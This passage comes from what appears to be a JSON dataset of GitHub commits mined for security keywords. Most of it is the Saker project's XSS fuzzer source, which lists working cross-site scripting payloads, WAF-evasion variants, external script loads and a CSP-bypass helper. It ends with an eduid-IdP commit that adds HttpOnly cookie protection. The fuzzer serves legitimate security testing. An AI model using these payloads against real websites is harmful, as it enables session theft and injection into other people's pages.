'<style/onload=\"%s\"></style>' % payload\n\n    def input(self, payload):\n        return '<input/onfocus=\"%s\"/autofocus>' % payload\n\n    def marquee(self, payload):\n        return '<marquee/onstart=\"%s\"></marquee>' % payload\n\n    def div(self, payload):\n        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n"
                }
            },
            "msg": "update xss payload"
        },
        "9d9faf7de059066aab203f069eade13e89a93b39": {
            "url": "https://api.github.com/repos/LyleMi/Saker/commits/9d9faf7de059066aab203f069eade13e89a93b39",
            "html_url": "https://github.com/LyleMi/Saker/commit/9d9faf7de059066aab203f069eade13e89a93b39",
            "sha": "9d9faf7de059066aab203f069eade13e89a93b39",
            "keyword": "XSS update",
            "diff": "diff --git a/saker/fuzzers/xss.py b/saker/fuzzers/xss.py\nindex 235222d..9bafac0 100644\n--- a/saker/fuzzers/xss.py\n+++ b/saker/fuzzers/xss.py\n@@ -293,6 +293,22 @@\n     \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\"\n ]\n \n+# reg test payloads\n+_reg_payloads = [\n+    # no reg\n+    \"<svg\",\n+    # <[a-z]+\n+    \"<dev\",\n+    # ^<[a-z]+\n+    \"x<dev\",\n+    # <[a-zA-Z]+\n+    \"<dEv\",\n+    # <[a-zA-Z0-9]+\n+    \"<d3V\",\n+    # <.+\n+    \"<d|3v \",\n+]\n+\n # payload for waf test\n _waf_payloads = [\n     \"<IMG SRC=JaVaScRiPt:alert('xss')>\",\n@@ -323,7 +339,15 @@\n     '<svg/onload=co\\u006efir\\u006d`1`>',\n     '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>',\n     '<scriscriptpt>alert(/xss/)</scriscriptpt>',\n-    '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be'\n+    '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be',\n+    '<a\"/onclick=(confirm)()>click',\n+    '<a/href=javascript&colon;alert()>click',\n+    '<a/href=&#74;ava%0a%0d%09script&colon;alert()>click',\n+    '<d3v/onauxclick=[2].some(confirm)>click',\n+    '<d3v/onauxclick=(((confirm)))\">click',\n+    '<d3v/onmouseleave=[2].some(confirm)>click',\n+    '<details/open/ontoggle=alert()>',\n+    '<details/open/ontoggle=(confirm)()//'\n ]\n \n # payload with html 5 features\n@@ -351,6 +375,7 @@ class XSS(Fuzzer):\n     htmlTemplate = _htmlTemplate\n     probes = _probes\n     payloads = _payloads\n+    reg_payloads = _reg_payloads\n     waf_payloads = _waf_payloads\n     h5payloads = _h5payloads\n \n@@ -380,24 +405,48 @@ def acmehttp01(cls, url):\n         # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/\n         return url + '/.well-known/acme-challenge/?<h1>hi'\n \n-    def img(self, payload):\n+    @classmethod\n+    def img(cls, payload):\n         return '<img/onerror=\"%s\"/src=x>' % payload\n \n-    def svg(self, payload):\n+    @classmethod\n+    def svg(cls, payload):\n         return '<svg/onload=\"%s\"/>' % payload\n \n-    def style(self, payload):\n+    @classmethod\n+    def style(cls, payload):\n         return '<style/onload=\"%s\"></style>' % payload\n \n-    def input(self, payload):\n+    @classmethod\n+    def input(cls, payload):\n         return '<input/onfocus=\"%s\"/autofocus>' % payload\n \n-    def marquee(self, payload):\n+    @classmethod\n+    def marquee(cls, payload):\n         return '<marquee/onstart=\"%s\"></marquee>' % payload\n \n-    def div(self, payload):\n+    @classmethod\n+    def div(cls, payload):\n         return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n \n+    @classmethod\n+    def template(cls, tag=\"img\", delimiter=\" \", event_handler=\"onerror\", javascript=\"alert(/xss/)\", ending=\">\"):\n+        '''\n+        delimiter \" \"\n+        delimiter \"\\x09\"\n+        delimiter \"\\x09\\x09\"\n+        delimiter \"/\"\n+        delimiter \"\\x0a\"\n+        delimiter \"\\x0d\"\n+        delimiter \"/~/\"\n+        ending \">\"\n+        ending \"//\"\n+        ending \" \"\n+        ending \"\\t\"\n+        ending \"\\n\"\n+        '''\n+        return f\"<{tag}{delimiter}{event_handler}={javascript}{delimiter}{ending}\"\n+\n     def script(self):\n         payload = \"<script src='%s'></script>\" % self.url\n         return payload\n",
            "message": "",
            "files": {
                "/saker/fuzzers/xss.py": {
                    "changes": [
                        {
                            "diff": "\n         # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/\n         return url + '/.well-known/acme-challenge/?<h1>hi'\n \n-    def img(self, payload):\n+    @classmethod\n+    def img(cls, payload):\n         return '<img/onerror=\"%s\"/src=x>' % payload\n \n-    def svg(self, payload):\n+    @classmethod\n+    def svg(cls, payload):\n         return '<svg/onload=\"%s\"/>' % payload\n \n-    def style(self, payload):\n+    @classmethod\n+    def style(cls, payload):\n         return '<style/onload=\"%s\"></style>' % payload\n \n-    def input(self, payload):\n+    @classmethod\n+    def input(cls, payload):\n         return '<input/onfocus=\"%s\"/autofocus>' % payload\n \n-    def marquee(self, payload):\n+    @classmethod\n+    def marquee(cls, payload):\n         return '<marquee/onstart=\"%s\"></marquee>' % payload\n \n-    def div(self, payload):\n+    @classmethod\n+    def div(cls, payload):\n         return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n \n+    @classmethod\n+    def template(cls, tag=\"img\", delimiter=\" \", event_handler=\"onerror\", javascript=\"alert(/xss/)\", ending=\">\"):\n+        '''\n+        delimiter \" \"\n+        delimiter \"\\x09\"\n+        delimiter \"\\x09\\x09\"\n+        delimiter \"/\"\n+        delimiter \"\\x0a\"\n+        delimiter \"\\x0d\"\n+        delimiter \"/~/\"\n+        ending \">\"\n+        ending \"//\"\n+        ending \" \"\n+        ending \"\\t\"\n+        ending \"\\n\"\n+        '''\n+        return f\"<{tag}{delimiter}{event_handler}={javascript}{delimiter}{ending}\"\n+\n     def script(self):\n         payload = \"<script src='%s'></script>\" % self.url\n         return payload\n",
                            "add": 30,
                            "remove": 6,
                            "filename": "/saker/fuzzers/xss.py",
                            "badparts": [
                                "    def img(self, payload):",
                                "    def svg(self, payload):",
                                "    def style(self, payload):",
                                "    def input(self, payload):",
                                "    def marquee(self, payload):",
                                "    def div(self, payload):"
                            ],
                            "goodparts": [
                                "    @classmethod",
                                "    def img(cls, payload):",
                                "    @classmethod",
                                "    def svg(cls, payload):",
                                "    @classmethod",
                                "    def style(cls, payload):",
                                "    @classmethod",
                                "    def input(cls, payload):",
                                "    @classmethod",
                                "    def marquee(cls, payload):",
                                "    @classmethod",
                                "    def div(cls, payload):",
                                "    @classmethod",
                                "    def template(cls, tag=\"img\", delimiter=\" \", event_handler=\"onerror\", javascript=\"alert(/xss/)\", ending=\">\"):",
                                "        '''",
                                "        delimiter \" \"",
                                "        delimiter \"\\x09\"",
                                "        delimiter \"\\x09\\x09\"",
                                "        delimiter \"/\"",
                                "        delimiter \"\\x0a\"",
                                "        delimiter \"\\x0d\"",
                                "        delimiter \"/~/\"",
                                "        ending \">\"",
                                "        ending \"//\"",
                                "        ending \" \"",
                                "        ending \"\\t\"",
                                "        ending \"\\n\"",
                                "        '''",
                                "        return f\"<{tag}{delimiter}{event_handler}={javascript}{delimiter}{ending}\""
                            ]
                        }
                    ],
                    "source": "\n from saker.fuzzers.fuzzer import Fuzzer _tags=[ 'a', 'abbr', 'acronym', 'address', 'applet', 'area', 'article', 'aside', 'audio', 'b', 'base', 'basefont', 'bdi', 'bdo', 'bgsound', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'wbr', 'xmp', ] _events=[ 'onabort', 'onautocomplete', 'onautocompleteerror', 'onafterscriptexecute', 'onanimationend', 'onanimationiteration', 'onanimationstart', 'onbeforecopy', 'onbeforecut', 'onbeforeload', 'onbeforepaste', 'onbeforescriptexecute', 'onbeforeunload', 'onbegin', 'onblur', 'oncanplay', 'oncanplaythrough', 'onchange', 'onclick', 'oncontextmenu', 'oncopy', 'oncut', 'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'ondurationchange', 'onend', 'onemptied', 'onended', 'onerror', 'onfocus', 'onfocusin', 'onfocusout', 'onhashchange', 'oninput', 'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onmessage', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onoffline', 'ononline', 'onorientationchange', 'onpagehide', 'onpageshow', 'onpaste', 'onpause', 'onplay', 'onplaying', 'onpopstate', 'onprogress', 'onratechange', 'onreset', 'onresize', 'onscroll', 'onsearch', 'onseeked', 'onseeking', 'onselect', 'onselectionchange', 'onselectstart', 'onstalled', 'onstorage', 'onsubmit', 'onsuspend', 'ontimeupdate', 'ontoggle', 'ontouchcancel', 'ontouchend', 'ontouchmove', 'ontouchstart', 'ontransitionend', 'onunload', 'onvolumechange', 'onwaiting', 'onwebkitanimationend', 'onwebkitanimationiteration', 'onwebkitanimationstart', 'onwebkitfullscreenchange', 'onwebkitfullscreenerror', 'onwebkitkeyadded', 'onwebkitkeyerror', 'onwebkitkeymessage', 'onwebkitneedkey', 'onwebkitsourceclose', 'onwebkitsourceended', 'onwebkitsourceopen', 'onwebkitspeechchange', 'onwebkittransitionend', 'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<svg/onload=eval(window.name)>', '<svg/onload=eval(location.hash.slice(1))>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\", \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\" ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script>alert(\"xss\");//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>', '<scriscriptpt>alert(/xss/)</scriscriptpt>', '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be' ] _h5payloads=[ '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +'<input autofocus>', '<video><source onerror=\"alert(1)\">', '<video onerror=\"alert(1)\"><source></source></video>', '<form><button formaction=\"javascript:alert(1)\">X</button>', '<math href=\"javascript:alert(1)\">CLICKME</math>', '<link rel=\"import\" href=\"test.svg\" />', '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />', ] class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" tags=_tags events=_events htmlTemplate=_htmlTemplate probes=_probes payloads=_payloads waf_payloads=_waf_payloads h5payloads=_h5payloads def __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +=''' %s=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return payload def cspBypass(self): return \"<link rel='preload' href='%s'>\" % self.url ",
                    "sourceWithComments": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n_tags = [\n    'a',\n    'abbr',\n    'acronym',\n    'address',\n    'applet',\n    'area',\n    'article',\n    'aside',\n    'audio',\n    'b',\n    'base',\n    'basefont',\n    'bdi',\n    'bdo',\n    'bgsound',\n    'big',\n    'blink',\n    'blockquote',\n    'body',\n    'br',\n    'button',\n    'canvas',\n    'caption',\n    'center',\n    'cite',\n    'code',\n    'col',\n    'colgroup',\n    'command',\n    'content',\n    'data',\n    'datalist',\n    'dd',\n    'del',\n    'details',\n    'dfn',\n    'dialog',\n    'dir',\n    'div',\n    'dl',\n    'dt',\n    'element',\n    'em',\n    'embed',\n    'fieldset',\n    'figcaption',\n    'figure',\n    'font',\n    'footer',\n    'form',\n    'frame',\n    'frameset',\n    'h1',\n    'h2',\n    'h3',\n    'h4',\n    'h5',\n    'h6',\n    'head',\n    'header',\n    'hgroup',\n    'hr',\n    'html',\n    'i',\n    'iframe',\n    'image',\n    'img',\n    'input',\n    'ins',\n    'isindex',\n    'kbd',\n    'keygen',\n    'label',\n    'layer',\n    'legend',\n    'li',\n    'link',\n    'listing',\n    'main',\n    'map',\n    'mark',\n    'marquee',\n    'menu',\n    'menuitem',\n    'meta',\n    'meter',\n    'multicol',\n    'nav',\n    'nobr',\n    'noembed',\n    'noframes',\n    'nolayer',\n    'noscript',\n    'object',\n    'ol',\n    'optgroup',\n    'option',\n    'output',\n    'p',\n    'param',\n    'picture',\n    # 'plaintext',\n    'pre',\n    'progress',\n    'q',\n    'rp',\n    'rt',\n    'rtc',\n    'ruby',\n    's',\n    'samp',\n    'script',\n    'section',\n    'select',\n    'shadow',\n    'small',\n    'source',\n    'spacer',\n    'span',\n    'strike',\n    'strong',\n    'style',\n    'sub',\n    'summary',\n    'sup',\n    'table',\n    'tbody',\n    'td',\n    'template',\n    'textarea',\n    'tfoot',\n    'th',\n    'thead',\n    'time',\n    'title',\n    'tr',\n    'track',\n    'tt',\n    'u',\n    'ul',\n    'var',\n    'video',\n    'wbr',\n    'xmp',\n]\n\n_events = [\n    'onabort',\n    'onautocomplete',\n    'onautocompleteerror',\n    'onafterscriptexecute',\n    'onanimationend',\n    'onanimationiteration',\n    'onanimationstart',\n    'onbeforecopy',\n    'onbeforecut',\n    'onbeforeload',\n    'onbeforepaste',\n    'onbeforescriptexecute',\n    'onbeforeunload',\n    'onbegin',\n    'onblur',\n    'oncanplay',\n    'oncanplaythrough',\n    'onchange',\n    'onclick',\n    'oncontextmenu',\n    'oncopy',\n    'oncut',\n    'ondblclick',\n    'ondrag',\n    'ondragend',\n    'ondragenter',\n    'ondragleave',\n    'ondragover',\n    'ondragstart',\n    'ondrop',\n    'ondurationchange',\n    'onend',\n    'onemptied',\n    'onended',\n    'onerror',\n    'onfocus',\n    'onfocusin',\n    'onfocusout',\n    'onhashchange',\n    'oninput',\n    'oninvalid',\n    'onkeydown',\n    'onkeypress',\n    'onkeyup',\n    'onload',\n    'onloadeddata',\n    'onloadedmetadata',\n    'onloadstart',\n    'onmessage',\n    'onmousedown',\n    'onmouseenter',\n    'onmouseleave',\n    'onmousemove',\n    'onmouseout',\n    'onmouseover',\n    'onmouseup',\n    'onmousewheel',\n    'onoffline',\n    'ononline',\n    'onorientationchange',\n    'onpagehide',\n    'onpageshow',\n    'onpaste',\n    'onpause',\n    'onplay',\n    'onplaying',\n    'onpopstate',\n    'onprogress',\n    'onratechange',\n    'onreset',\n    'onresize',\n    'onscroll',\n    'onsearch',\n    'onseeked',\n    'onseeking',\n    'onselect',\n    'onselectionchange',\n    'onselectstart',\n    'onstalled',\n    'onstorage',\n    'onsubmit',\n    'onsuspend',\n    'ontimeupdate',\n    'ontoggle',\n    'ontouchcancel',\n    'ontouchend',\n    'ontouchmove',\n    'ontouchstart',\n    'ontransitionend',\n    'onunload',\n    'onvolumechange',\n    'onwaiting',\n    'onwebkitanimationend',\n    'onwebkitanimationiteration',\n    'onwebkitanimationstart',\n    'onwebkitfullscreenchange',\n    'onwebkitfullscreenerror',\n    'onwebkitkeyadded',\n    'onwebkitkeyerror',\n    'onwebkitkeymessage',\n    'onwebkitneedkey',\n    'onwebkitsourceclose',\n    'onwebkitsourceended',\n    'onwebkitsourceopen',\n    'onwebkitspeechchange',\n    'onwebkittransitionend',\n    'onwheel'\n]\n\n_htmlTemplate = '''\n<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS Fuzzer</title>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n</head>\n<body>\n%s\n</body>\n</html>\n'''\n\n# probe for test xss vuln\n_probes = [\n    \"\"\"'';!--\"<XSS>=&{()}\"\"\",\n]\n\n# xss payloads\n_payloads = [\n    '<q/oncut=open()>',\n    '<svg/onload=eval(name)>',\n    '<svg/onload=eval(window.name)>',\n    '<svg/onload=eval(location.hash.slice(1))>',\n    '<img src=x onerror=alert(/xss/)>',\n    \"\"\"<img src=\"javascript:alert('xss');\">\"\"\",\n    \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\",\n    \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\",\n    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\"\n]\n\n# payload for waf test\n_waf_payloads = [\n    \"<IMG SRC=JaVaScRiPt:alert('xss')>\",\n    '<<script>alert(\"xss\");//<</script>',\n    \"\"\"<img src=\"javascript:alert('xss')\" \"\"\",\n    '<a href=\"javascript%26colon;alert(1)\">click',\n    '<a href=javas&#99;ript:alert(1)>click',\n    '<--`<img/src=` onerror=confirm``> --!>',\n    '\\'\"</Script><Html Onmouseover=(confirm)()//'\n    '<imG/sRc=l oNerrOr=(prompt)() x>',\n    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',\n    '<deTails open oNToggle=confi\\u0072m()>',\n    '<img sRc=l oNerrOr=(confirm)() x>',\n    '<svg/x=\">\"/onload=confirm()//',\n    '<svg%0Aonload=%09((pro\\u006dpt))()//',\n    '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>',\n    '<sCript x>confirm``</scRipt x>',\n    '<Script x>prompt()</scRiPt x>',\n    '<sCriPt sRc=//t.cn>',\n    '<embed//sRc=//t.cn>',\n    '<base href=//t.cn/><script src=/>',\n    '<object//data=//t.cn>',\n    '<s=\" onclick=confirm``>clickme',\n    '<svG oNLoad=co\\u006efirm&#x28;1&#x29>',\n    '\\'\"><y///oNMousEDown=((confirm))()>Click',\n    '<a/href=javascript&colon;co\\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',\n    '<img src=x onerror=confir\\u006d`1`>',\n    '<svg/onload=co\\u006efir\\u006d`1`>',\n    '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>',\n    '<scriscriptpt>alert(/xss/)</scriscriptpt>',\n    '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be'\n]\n\n# payload with html 5 features\n# http://html5sec.org\n_h5payloads = [\n    '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>',\n    '<input onfocus=alert(1) autofocus>',\n    '<input onblur=alert(1) autofocus><input autofocus>',\n    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',\n    '<video><source onerror=\"alert(1)\">',\n    '<video onerror=\"alert(1)\"><source></source></video>',\n    '<form><button formaction=\"javascript:alert(1)\">X</button>',\n    '<math href=\"javascript:alert(1)\">CLICKME</math>',\n    '<link rel=\"import\" href=\"test.svg\" />',\n    '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />',\n]\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    tags = _tags\n    events = _events\n    htmlTemplate = _htmlTemplate\n    probes = _probes\n    payloads = _payloads\n    waf_payloads = _waf_payloads\n    h5payloads = _h5payloads\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @classmethod\n    def alterTest(cls, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    @classmethod\n    def genTestHTML(cls):\n        s = ''\n        for t in cls.tags:\n            s += '<%s src=\"x\"' % t\n            for e in cls.events:\n                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)\n            s += '>%s</%s>\\n' % (t, t)\n        return cls.htmlTemplate % s\n\n    @classmethod\n    def acmehttp01(cls, url):\n        # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/\n        return url + '/.well-known/acme-challenge/?<h1>hi'\n\n    def img(self, payload):\n        return '<img/onerror=\"%s\"/src=x>' % payload\n\n    def svg(self, payload):\n        return '<svg/onload=\"%s\"/>' % payload\n\n    def style(self, payload):\n        return '<style/onload=\"%s\"></style>' % payload\n\n    def input(self, payload):\n        return '<input/onfocus=\"%s\"/autofocus>' % payload\n\n    def marquee(self, payload):\n        return '<marquee/onstart=\"%s\"></marquee>' % payload\n\n    def div(self, payload):\n        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n"
                }
            },
            "msg": "update xss fuzzer"
        }
    },
    "https://github.com/SUNET/eduid-IdP": {
        "e106ab1a6491342c9084772fba9f5c7b29be8d65": {
            "url": "https://api.github.com/repos/SUNET/eduid-IdP/commits/e106ab1a6491342c9084772fba9f5c7b29be8d65",
            "html_url": "https://github.com/SUNET/eduid-IdP/commit/e106ab1a6491342c9084772fba9f5c7b29be8d65",
            "sha": "e106ab1a6491342c9084772fba9f5c7b29be8d65",
            "keyword": "XSS protect",
            "diff": "diff --git a/setup.py b/setup.py\nindex 54379db..8ea5193 100755\n--- a/setup.py\n+++ b/setup.py\n@@ -7,7 +7,7 @@\n here = os.path.abspath(os.path.dirname(__file__))\n README = open(os.path.join(here, 'README')).read()\n \n-version = '0.3.22'\n+version = '0.3.23b0'\n \n install_requires = [\n     'pymongo>=2.8,<3',\ndiff --git a/src/eduid_idp/config.py b/src/eduid_idp/config.py\nindex c0dabb5..d1e1e40 100644\n--- a/src/eduid_idp/config.py\n+++ b/src/eduid_idp/config.py\n@@ -62,18 +62,19 @@\n                     'content_packages': [],  # List of Python packages (\"name:path\") with content resources\n                     'verify_request_signatures': '0',  # '1' for True, '0' for False\n                     'status_test_usernames': [],\n-                    'signup_link': '#',  # for login.html\n-                    'dashboard_link': '#',  # for forbidden.html\n-                    'password_reset_link': '#',  # for login.html\n+                    'signup_link': '#',         # for login.html\n+                    'dashboard_link': '#',      # for forbidden.html\n+                    'password_reset_link': '#', # for login.html\n                     'default_language': 'en',\n                     'base_url': None,\n                     'default_eppn_scope': None,\n                     'authn_info_mongo_uri': None,\n-                    'max_authn_failures_per_month': '50',  # Kantara 30-day bad authn limit is 100\n+                    'max_authn_failures_per_month': '50', # Kantara 30-day bad authn limit is 100\n                     'login_state_ttl': '5',   # time to complete an IdP login, in minutes\n                     'default_scoped_affiliation': None,\n-                    'vccs_url': 'http://localhost:8550/',    # VCCS backend URL\n-                    'insecure_cookies': '0',                     # Set to 1 to not set HTTP Cookie 'secure' flag\n+                    'vccs_url': 'http://localhost:8550/', # VCCS backend URL\n+                    'insecure_cookies': '0', # Set to 1 to not set HTTP Cookie 'secure' flag\n+                    'httponly_cookies': '1', # Set to 0 to not protect against XSS vulnerabilities.\n                     }\n \n _CONFIG_SECTION = 'eduid_idp'\n@@ -423,3 +424,13 @@ def insecure_cookies(self):\n         Set to True to NOT set HTTP Cookie 'secure' flag (boolean).\n         \"\"\"\n         return self.config.getboolean(self.section, 'insecure_cookies')\n+\n+    @property\n+    def httponly_cookies(self):\n+        \"\"\"\n+        Set to False to NOT set HTTP Cookie 'httponly' flag (boolean).\n+\n+        This flag protects against common cross-site scripting (XSS) by\n+        not allowing client side scripts e.g. JavaScript to access cookies.\n+        \"\"\"\n+        return self.config.getboolean(self.section, 'httponly_cookies')\ndiff --git a/src/eduid_idp/mischttp.py b/src/eduid_idp/mischttp.py\nindex f1e069a..8d361d3 100644\n--- a/src/eduid_idp/mischttp.py\n+++ b/src/eduid_idp/mischttp.py\n@@ -313,6 +313,8 @@ def set_cookie(name, path, logger, config, value=''):\n     cookie[name]['path'] = path\n     if not config.insecure_cookies:\n         cookie[name]['secure'] = True  # ask browser to only send cookie using SSL/TLS\n+    if config.httponly_cookies:\n+        cookie[name]['httponly'] = True # protect against common XSS vulnerabilities\n     logger.debug(\"Set cookie : {!s}\".format(cookie))\n     return True\n \n",
            "message": "",
            "files": {
                "/setup.py": {
                    "changes": [
                        {
                            "diff": "\n here = os.path.abspath(os.path.dirname(__file__))\n README = open(os.path.join(here, 'README')).read()\n \n-version = '0.3.22'\n+version = '0.3.23b0'\n \n install_requires = [\n     'pymongo>=2.8,<3',",
                            "add": 1,
                            "remove": 1,
                            "filename": "/setup.py",
                            "badparts": [
                                "version = '0.3.22'"
                            ],
                            "goodparts": [
                                "version = '0.3.23b0'"
                            ]
                        }
                    ],
